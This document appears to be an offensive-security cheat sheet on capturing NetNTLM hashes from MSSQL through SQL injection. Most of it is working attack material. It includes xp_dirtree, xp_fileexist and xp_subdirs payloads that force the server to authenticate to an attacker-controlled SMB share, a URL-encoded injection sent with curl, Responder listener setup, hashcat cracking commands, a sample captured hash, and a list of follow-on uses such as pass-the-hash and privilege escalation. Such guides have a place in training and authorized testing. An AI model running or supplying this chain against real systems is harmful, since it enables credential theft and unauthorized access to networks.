# 🔑 Leaking NetNTLM Hashes

## Overview

Database administrators often set up service accounts for MSSQL to access network shares. If SQLi is found, we can capture NetNTLM credentials by coercing the SQL server to authenticate to our SMB share.

---

## Attack Flow

```
1. Start Responder (SMB listener)
2. Inject xp_dirtree to access our "share"
3. Capture NetNTLM hash
4. Crack hash with hashcat
```

---

## Step 1: Start Responder

### Clone Repository

```bash
git clone https://github.com/lgandx/Responder
cd Responder
```

### Start Listening

```bash
sudo python3 Responder.py -I tun0
```

**Verify SMB is ON**:
```
[+] Servers:
    HTTP server                [ON]
    SMB server                 [ON]
    ...
```

> If SMB is OFF, edit `Responder.conf` and set `SMB = On`

---

## Step 2: Trigger SMB Authentication

### SQL Query

```sql
EXEC master..xp_dirtree '\\<ATTACKER_IP>\myshare', 1, 1;
```

This attempts to list contents of SMB share, requiring authentication.

### SQLi Payload

```sql
';EXEC master..xp_dirtree '\\<ATTACKER_IP>\myshare', 1, 1;--
```

### URL Encode

```bash
printf %s "';EXEC master..xp_dirtree '\\\\10.10.15.75\myshare', 1, 1;--" | jq -rR @uri
```

**Output**: `'%3BEXEC%20master..xp_dirtree%20'%5C%5C10.10.15.75%5Cmyshare'%2C%201%2C%201%3B--`

### Send Request

```bash
curl -s "http://<TARGET>/api/check-username.php?u='%3BEXEC%20master..xp_dirtree%20'%5C%5C10.10.15.75%5Cmyshare'%2C%201%2C%201%3B--"
```

---

## Step 3: Capture Hash

### Responder Output

```
[+] Listening for events...

[SMB] NTLMv2-SSP Client   : 192.168.43.156
[SMB] NTLMv2-SSP Username : SQL01\jason
[SMB] NTLMv2-SSP Hash     : jason::SQL01:bd7f162c24a39a0f:94DF80C5ABBA...<SNIP>...000000
```

**Captured**:
- **Client IP**: 192.168.43.156
- **Username**: SQL01\jason
- **Hash**: NetNTLMv2 hash

---

## Step 4: Crack the Hash

### Hashcat Command

```bash
hashcat -m 5600 '<HASH>' /usr/share/wordlists/rockyou.txt
```

### Full Example

```bash
hashcat -m 5600 -O -w 3 'jason::SQL01:bd7f162c24a39a0f:94DF80C5ABB...<SNIP>...000000' /usr/share/wordlists/rockyou.txt
```

### Output

```
jason::SQL01:bd7f162c24a39a0f:94DF80C5ABB...<SNIP>...000000:<CRACKED_PASSWORD>

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 5600 (NetNTLMv2)
Recovered........: 1/1 (100.00%) Digests
```

---

## Alternative SMB Coercion Methods

| Function | Query |
|----------|-------|
| **xp_dirtree** | `EXEC master..xp_dirtree '\\IP\share', 1, 1;` |
| **xp_fileexist** | `EXEC master..xp_fileexist '\\IP\share\file';` |
| **xp_subdirs** | `EXEC master..xp_subdirs '\\IP\share';` |

---

## Complete Attack Chain

```bash
# 1. Start Responder
sudo responder -I tun0

# 2. URL encode payload
printf %s "';EXEC master..xp_dirtree '\\\\<ATTACKER_IP>\myshare', 1, 1;--" | jq -rR @uri

# 3. Send payload
curl -s "http://<TARGET>/api/check-username.php?u=<URL_ENCODED_PAYLOAD>"

# 4. Check Responder for captured hash

# 5. Crack with hashcat
hashcat -m 5600 '<HASH>' /usr/share/wordlists/rockyou.txt
```

---

## Hash Format Reference

### NetNTLMv2 Format

```
username::domain:challenge:response:blob
```

### Hashcat Mode

| Hash Type | Mode |
|-----------|------|
| NetNTLMv1 | 5500 |
| **NetNTLMv2** | **5600** |

---

## Troubleshooting

### No Hash Captured

1. Verify Responder SMB is ON
2. Check firewall allows SMB (port 445)
3. Verify network connectivity
4. Try different coercion method

### Hash Won't Crack

1. Try larger wordlist
2. Add rules: `-r /usr/share/hashcat/rules/best64.rule`
3. May be strong password (not in wordlist)

---

## Use Cases

After cracking password:
- **WinRM access** (if enabled)
- **RDP access** (if enabled)
- **SMB access** to file shares
- **Pass-the-hash** attacks
- **Privilege escalation**

---

## Quick Reference

### Responder

```bash
sudo responder -I tun0
```

### Payload

```sql
';EXEC master..xp_dirtree '\\<ATTACKER_IP>\share', 1, 1;--
```

### Crack

```bash
hashcat -m 5600 'hash' wordlist.txt
```

